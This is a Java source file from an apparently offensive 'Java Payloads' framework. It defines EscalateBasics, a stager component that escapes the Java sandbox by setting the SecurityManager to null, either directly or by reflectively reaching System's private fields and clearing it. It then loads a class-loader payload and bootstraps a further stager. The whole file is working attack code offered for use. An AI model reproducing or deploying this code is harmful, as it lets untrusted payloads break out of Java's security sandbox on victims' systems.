/*
 * Java Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.escalate;

import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import javapayload.stager.Stager;

/**
 * This class contains static methods for basic sandbox privilege escalation,
 * that work without any additional classes. They are designed to be copied into
 * a (dyn-)stager, therefore this class extends {@link Stager}.
 */
public class EscalateBasics extends Stager {

	public static boolean escalate() throws Exception {
		// +RuntimePermission(setSecurityManager)
		try {
			System.setSecurityManager(null);
			return true;
		} catch (SecurityException ex) {
		}

		// +RuntimePermission(accessDeclaredMembers)
		// +ReflectPermission(suppressAccessChecks)
		try {
			Method getDeclaredFields0 = Class.forName("java.lang.Class").getDeclaredMethod("getDeclaredFields0", new Class[] { Boolean.TYPE });
			getDeclaredFields0.setAccessible(true);
			Field[] fields = (Field[]) getDeclaredFields0.invoke(Class.forName("java.lang.System"), new Object[] { Boolean.FALSE });
			Class securityManagerClass = Class.forName("java.lang.SecurityManager");
			for (int i = 0; i < fields.length; i++) {
				if (fields[i].getType().equals(securityManagerClass)) {
					fields[i].setAccessible(true);
					fields[i].set(null, null);
					return true;
				}
			}
		} catch (SecurityException ex) {
		}

		return false;
	}

	// helper methods used by Escalate dynstager

	private final Object realStager;

	public EscalateBasics() throws Exception {
		this(escalateFromDynstager());
	}

	public EscalateBasics(boolean loadStager) throws Exception {
		if (loadStager) {
			define("STAGER_CLASS");
			realStager = define("BASE_STAGER").newInstance();
		} else {
			realStager = null;
		}
	}
	
	private Class define(String classConstant) throws IOException {
		return define(classConstant.getBytes("ISO-8859-1"));
	}

	private static boolean escalateFromDynstager() throws Exception {
		if (escalate())
			return true;

		// +RuntimePermission(createClassLoader)
		try {
			new EscalateBasics(false).define("CREATE_CLASS_LOADER_PAYLOAD").newInstance();
			return true;
		} catch (SecurityException ex) {
		}

		// class may not be available, therefore ignore errors
		try {
			EscalateLoader.escalate();
		} catch (Throwable t) {
		}
		return true;
	}

	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
		realStager.getClass().getMethod("bootstrap", new Class[] { Class.forName("[Ljava.lang.String;"), Boolean.TYPE }).invoke(realStager, new Object[] { parameters, new Boolean(needWait) });
	}

	public void waitReady() throws InterruptedException {
		try {
			realStager.getClass().getMethod("waitReady", new Class[0]).invoke(realStager, new Object[0]);
		} catch (Exception ex) {
			/* #JDK1.4 */try {
				throw new RuntimeException(ex);
			} catch (NoSuchMethodError ex2) /**/{
				throw new RuntimeException(ex.toString());
			}
		}
	}
}